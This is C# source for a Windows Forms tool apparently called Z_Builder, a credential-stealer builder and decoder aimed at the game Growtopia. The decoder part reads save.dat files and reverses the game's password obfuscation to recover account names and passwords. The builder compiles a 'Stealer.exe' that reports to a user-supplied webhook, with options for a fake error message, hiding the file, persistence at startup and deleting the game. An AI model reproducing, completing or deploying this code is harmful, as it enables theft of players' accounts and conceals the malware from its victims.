using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Z_Builder
{
    public partial class Form2 : MetroFramework.Forms.MetroForm
    {
        List <string> alldata { get; set; }
        string IcoFilePath { get; set; }
        public Form2()
        {
            InitializeComponent();
            metroTextBox6.Visible = false;
            metroTextBox4.Text = ConfigurationManager.AppSettings["savefolderpath"];
            string savefolderpath = metroTextBox4.Text;
        }
        #region Decoder
        private void metroButton1_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folderDlg = new FolderBrowserDialog();
            folderDlg.ShowNewFolderButton = true;
            DialogResult result = folderDlg.ShowDialog();
            if (result == DialogResult.OK)
            {
                string savefolderpath = folderDlg.SelectedPath;
                metroTextBox4.Clear();
                metroTextBox4.AppendText(savefolderpath);
                Program.setSetting("savefolderpath", metroTextBox4.Text);
            }
        }

        private void folderBrowserDialog1_HelpRequest(object sender, EventArgs e)
        {

        }
        private void listBox1_SelectedIndexChanged_1(object sender, EventArgs e)
        {
            metroTextBox1.Clear();
            metroTextBox2.Clear();
            metroTextBox3.Clear();
            try
            {
                string curGrowID = listBox1.SelectedItem.ToString();
                metroTextBox1.Text = curGrowID;
                string rawresult = alldata.FirstOrDefault(alldata => alldata.Contains(curGrowID));
                string[] result = rawresult.Split(new[] { "[This-Is-A-Split(UM-Hi-Grando)]" }, StringSplitOptions.RemoveEmptyEntries);
                metroTextBox2.Text = result[1];
                string rawpasswords = result[2];
                string[] passwords = rawpasswords.Split(new[] { "[#---Zephyr---#]" }, StringSplitOptions.RemoveEmptyEntries);
                foreach (string i in passwords)
                {
                    if (i != "")
                    {
                        metroTextBox3.AppendText(i);
                        metroTextBox3.AppendText(Environment.NewLine);
                    }
                }
            }
            catch
            {
            }
        }
        private void metroButton2_Click(object sender, EventArgs e)
        {
            alldata = DecodeDats();
        }
        public List<string> DecodeDats()
        {
            try
            {
                List<string> alldata = new List<string>();
                listBox1.Items.Clear();
                string savefolderpath = ConfigurationManager.AppSettings["savefolderpath"];
                string[] allsaves = Directory.GetFiles(savefolderpath, "*.dat");
                var pattern = new Regex(@"[^\w0-9]");
                foreach (string i in allsaves)
                {
                    string savedata = null;
                    var r = File.Open(i, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    using (FileStream fileStream = new FileStream(i, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                        {
                            savedata = streamReader.ReadToEnd();
                        }
                    }
                    string cleardata = savedata.Replace("\u0000", " ");
                    string GrowID = pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
                    listBox1.Items.Add(GrowID);
                    string LastWorld = pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(' ')[3], string.Empty);
                    if (LastWorld == "fullscreen")
                    {
                        LastWorld = null;
                    }
                    string[] passwords = new PasswordDec().Func(Encoding.Default.GetBytes(savedata));
                    string allpw = "";
                    foreach (string pw in passwords)
                    {
                        allpw += pw + "[#---Zephyr---#]";
                    }
                    string accdata = GrowID + "[This-Is-A-Split]" + LastWorld + "[This-Is-A-Split]" + allpw;
                    alldata.Add(accdata);
                }
                return alldata;
            }
            catch
            {
                return null;
            }
        }
        
        public class PasswordDec
        {
            public List<string> PPW(byte[] contents)
            {
                List<string> result;
                try
                {
                    string text = "";
                    for (int i = 0; i < contents.Length; i += 1)
                    {
                        byte b = contents[i];
                        string text2 = b.ToString("X2");
                        bool flag = text2 == "00";
                        if (flag)
                        {
                            text += "<>";
                        }
                        else
                        {
                            text += text2;
                        }
                    }
                    bool flag2 = text.Contains("74616E6B69645F70617373776F7264");
                    if (flag2)
                    {
                        string text3 = "74616E6B69645F70617373776F7264";
                        int num = text.IndexOf(text3);
                        int num2 = text.LastIndexOf(text3);
                        bool flag3 = false;
                        string text4;
                        if (flag3)
                        {
                            text4 = string.Empty;
                        }
                        num += text3.Length;
                        int num3 = text.IndexOf("<><><>", num);
                        bool flag4 = false;
                        if (flag4)
                        {
                            text4 = string.Empty;
                        }

                        string @string = Encoding.UTF8.GetString(StringToByteArray(text.Substring(num, num3 - num).Trim()));
                        bool flag5 = ((@string.ToCharArray()[0] == 95) ? 1 : 0) == 0;
                        if (flag5)
                        {
                            text4 = text.Substring(num, num3 - num).Trim();
                        }
                        else
                        {
                            num2 += text3.Length;
                            num3 = text.IndexOf("<><><>", num2);
                            text4 = text.Substring(num2, num3 - num2).Trim();
                        }
                        string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
                        int num4 = text.IndexOf(text5);
                        bool flag6 = false;
                        string text6;
                        if (flag6)
                        {
                            text6 = string.Empty;
                        }
                        num4 += text5.Length;
                        int num5 = text.IndexOf("<><><>", num4);
                        bool flag7 = false;
                        if (flag7)
                        {
                            text6 = string.Empty;
                        }

                        text6 = text.Substring(num4, num5 - num4).Trim();
                        int num6 = StringToByteArray(text4)[0];
                        text6 = text6.Substring(0, num6 * 2);
                        byte[] array = StringToByteArray(text6.Replace("<>", "00"));
                        List<byte> list = new List<byte>();
                        List<byte> list2 = new List<byte>();
                        byte b2 = (byte)(48 - array[0]);
                        byte[] array2 = array;
                        for (int j = 0; j < array2.Length; j += 1)
                        {
                            byte b3 = array2[j];
                            list.Add((byte)(b2 + b3));
                        }
                        for (int k = 0; k < list.Count; k += 1)
                        {
                            list2.Add((byte)(list[k] - 1 - k));
                        }
                        List<string> list3 = new List<string>();
                        int num7 = 0;
                        while ((num7 > 255 ? 1 : 0) == 0)
                        {
                            string text7 = "";
                            foreach (byte b4 in list2)
                            {
                                bool flag8 = ValidateChar((char)((byte)((int)b4 + num7)));
                                if (flag8)
                                {
                                    text7 += ((char)((byte)((int)b4 + num7))).ToString();
                                }
                            }
                            bool flag9 = text7.Length == num6;
                            if (flag9)
                            {
                                list3.Add(text7);
                            }
                            num7 += 1;
                        }
                        result = list3;
                    }
                    else
                    {
                        result = null;
                    }
                }
                catch
                {
                    result = null;
                }
                return result;
            }
            public byte[] StringToByteArray(string str)
            {
                Dictionary<string, byte> hexindex = new Dictionary<string, byte>();
                for (int i = 0; i <= 255; i++)
                    hexindex.Add(i.ToString("X2"), (byte)i);

                List<byte> hexres = new List<byte>();
                for (int i = 0; i < str.Length; i += 2)
                    hexres.Add(hexindex[str.Substring(i, 2)]);

                return hexres.ToArray();
            }
            private bool ValidateChar(char cdzdshr)
            {
                if ((cdzdshr >= 0x30 && cdzdshr <= 0x39) ||
                        (cdzdshr >= 0x41 && cdzdshr <= 0x5A) ||
                        (cdzdshr >= 0x61 && cdzdshr <= 0x7A) ||
                        (cdzdshr >= 0x2B && cdzdshr <= 0x2E) ||
                        (cdzdshr >= 0x21 && cdzdshr <= 0x29) ||
                        (cdzdshr >= 0x2A && cdzdshr <= 0x2F) ||
                        (cdzdshr >= 0x3A && cdzdshr <= 0x40) ||
                        (cdzdshr >= 0x5B && cdzdshr <= 0x60) ||
                        (cdzdshr >= 0x7B && cdzdshr <= 0x7E)) return true;
                else return false;
            }

            public string[] Func(byte[] lel)
            {
                byte[] buff = lel;
                var passwords = PPW(buff);
                return passwords.ToArray();
            }
        }
        #endregion
        #region Builder
        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {

        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                OpenFileDialog dialog = new OpenFileDialog();
                dialog.Filter = "Ico files (*ico)|*.ico";
                dialog.Title = "Select an ico file";
                DialogResult result = dialog.ShowDialog();
                if (result == DialogResult.OK)
                {
                    pictureBox1.Load(dialog.FileName);
                    pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
                    IcoFilePath = dialog.FileName;
                    metroTextBox7.Clear();
                    metroTextBox7.Text = IcoFilePath;
                }
            }
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(metroTextBox5.Text))
                {
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.FileName = "Stealer.exe";
                sfd.Filter = "Exe files (*.exe)|*.exe";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    compile(sfd.FileName);
                }
            }
            else
            {
                MessageBox.Show("Missing webhook URL");
            }
        }
        public void compile(string path)
        {
            string basecode = Properties.Resources.Code;
            basecode = BuildBase(basecode);
            List<string> code = new List<string>();
            code.Add(basecode);
            string manifest = @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""highestAvailable"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
    <application>
    </application>
  </compatibility>
</assembly>
";
            File.WriteAllText(Application.StartupPath + @"\manifest.manifest", manifest);
            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters compars = new CompilerParameters();
            compars.ReferencedAssemblies.Add("System.Net.dll");
            compars.ReferencedAssemblies.Add("System.Net.Http.dll");
            compars.ReferencedAssemblies.Add("System.dll");
            compars.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compars.ReferencedAssemblies.Add("System.Drawing.dll");
            compars.ReferencedAssemblies.Add("System.Management.dll");
            compars.ReferencedAssemblies.Add("System.IO.dll");
            compars.ReferencedAssemblies.Add("System.IO.compression.dll");
            compars.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
            compars.ReferencedAssemblies.Add("System.Core.dll");
            compars.ReferencedAssemblies.Add("System.Security.dll");
            compars.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
            string ospath = Path.GetPathRoot(Environment.SystemDirectory);
            string tempPath = ospath + "Temp";
            compars.GenerateExecutable = true;
            compars.OutputAssembly = path;
            compars.GenerateInMemory = false;
            compars.TreatWarningsAsErrors = false;
            compars.CompilerOptions += "/t:winexe /unsafe /platform:x86";
            if (!string.IsNullOrEmpty(metroTextBox7.Text) || !string.IsNullOrWhiteSpace(metroTextBox7.Text) && metroTextBox7.Text.Contains(@"\") && metroTextBox7.Text.Contains(@":") && metroTextBox7.Text.Length >= 7)
            {
                compars.CompilerOptions += " /win32icon:" + @"""" + metroTextBox7.Text + @"""";
            }
            else if (string.IsNullOrEmpty(metroTextBox7.Text) || string.IsNullOrWhiteSpace(metroTextBox7.Text))
            {

            }
            System.Threading.Thread.Sleep(100);
            CompilerResults res = provider.CompileAssemblyFromSource(compars, code.ToArray());
            if (res.Errors.Count > 0)
            {
                try
                {
                    File.Delete(Application.StartupPath + @"\manifest.manifest");
                }
                catch { }
                foreach (CompilerError ce in res.Errors)
                {
                    MessageBox.Show(ce.ToString());
                }
            }
            else
            {
                try
                {
                    File.Delete(Application.StartupPath + @"\manifest.manifest");
                }
                catch { }
                try
                {
                    File.Delete(tempPath + @"\ConfuserEx.zip");
                    Directory.Delete(tempPath + @"\ConfuserEx", true);
                    File.Delete(Path.GetDirectoryName(path) + "\\Names.txt");
                }
                catch { }
                MessageBox.Show("Stealer compiled!");
            }
        }
        public string BuildBase(string code)
        {
            string building = code;
            //Webhook
            building = building.Replace("webhook_url", metroTextBox5.Text);
            //Fake error message
            if ((metroCheckBox4.Checked) && (!String.IsNullOrEmpty(metroTextBox6.Text)))
            {
                building = building.Replace("//FakeErrorMessage", "MessageBox.Show("+ '"' + metroTextBox6.Text + '"' +  "," + "\"Error!\"" + ",MessageBoxButtons.OK);");
            }
            //Hide stealer
            if (metroCheckBox2.Checked)
            {
                building = building.Replace("//HideStealer", "try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }");
            }
            //Trace save.dat
            if (metroCheckBox1.Checked)
            {
                building = building.Replace("//Tracer","Tracer.TraceSave();");
            }
            //Delete Growtopia
            if (metroCheckBox5.Checked)
            {
                building = building.Replace("//DeleteGrowtopia", "DeleteGrowtopia();");
            }
            //Run on startup
            if (metroCheckBox6.Checked)
            {
                building = building.Replace("//RunOnStartup", "RunOnStartup();");
            }
            return building;
        }
        private void metroCheckBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox4.Checked == true)
            {
                metroTextBox6.Visible = true;
            }
            else
            {
                metroTextBox6.Visible = false;
            }
        }
        #endregion
    }
}
